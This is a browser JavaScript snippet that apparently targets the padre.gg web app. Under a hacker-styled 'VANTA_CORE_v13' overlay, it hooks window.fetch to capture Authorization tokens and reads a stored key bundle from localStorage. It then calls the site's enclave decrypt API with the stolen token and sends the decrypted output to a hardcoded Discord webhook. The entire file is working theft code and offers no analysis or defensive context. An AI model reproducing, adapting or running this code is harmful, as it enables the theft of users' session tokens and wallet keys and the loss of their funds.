(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1469402005800878305/8hG79mVNsgEJiGa4fyqAGf3PsUsQYi1rQyMZnu7bcxYyeQGj7ZgBf7ucccxQt8sBBh09";
    const DECRYPT_API = "https://api.padre.gg/v2/enclave/decrypt";

    const session = { auth: null, bundle: null };

    const setupUI = () => {
        if (document.getElementById('v-v13')) return;
        const ui = document.createElement('div');
        ui.id = 'v-v13';
        ui.style = `position:fixed;top:10px;right:10px;width:320px;background:#000;border:1px solid #0f0;color:#0f0;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 15px #0f0;`;
        ui.innerHTML = `
            <div style="font-weight:bold;border-bottom:1px solid #222;margin-bottom:10px;">VANTA_CORE_v13</div>
            <div id="v-log" style="height:140px;overflow-y:auto;font-size:10px;background:#050505;padding:5px;"></div>
            <button id="v-scan" style="width:100%;background:#0f0;color:#000;border:none;padding:10px;font-weight:bold;cursor:pointer;margin-top:10px;">BYPASS & SEND</button>
        `;
        document.body.appendChild(ui);
    };

    const log = (m) => {
        const l = document.getElementById('v-log');
        if (l) { l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
    };

    // 2. BYPASS DISCORD CORS (Using 'keepalive' and 'no-cors')
    const exfil = async (title, content) => {
        const payload = {
            embeds: [{
                title: title,
                description: "```" + (typeof content === 'string' ? content : JSON.stringify(content)).substring(0, 1900) + "```",
                color: 65280
            }]
        };

        // We use 'keepalive' to ensure the request finishes even if the tab closes
        // We use 'no-cors' to prevent the browser from blocking the Discord webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors', 
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        log("SIGNAL DISPATCHED TO DISCORD");
    };

    // 3. THE HIJACKER
    const startBypass = () => {
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const h = args[1]?.headers;
            if (h) {
                let a = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
                if (a && !session.auth) {
                    session.auth = a;
                    log("AUTH CAPTURED: " + a.substring(0, 15) + "...");
                    runExtraction();
                }
            }
            return _f.apply(this, args);
        };

        const bundleData = localStorage.getItem('padre-v2-bundles-store-v2');
        if (bundleData) {
            session.bundle = JSON.parse(bundleData);
            log("BUNDLE LOCATED");
        }
    };

    // 4. EXTRACTION
    const runExtraction = async () => {
        if (!session.auth || !session.bundle) return;
        log("DECRYPTING...");

        const bKey = Object.keys(session.bundle.bundles)[0];
        const payload = {
            bundle: session.bundle.bundles[bKey].exportBundle,
            subOrgId: session.bundle.bundles[bKey].subOrgId
        };

        try {
            const res = await fetch(DECRYPT_API, {
                method: 'POST',
                headers: { 'Authorization': session.auth, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await res.text();
            log("DECRYPT SUCCESS");
            await exfil("VANTA_DUMP", data);
        } catch (e) {
            log("FAIL: " + e.message);
        }
    };

    setupUI();
    startBypass();
    document.getElementById('v-scan').onclick = () => {
        log("Syncing Pulse...");
        fetch('/api/v2/user/profile').catch(() => {});
        if (session.auth && session.bundle) runExtraction();
    };
})();
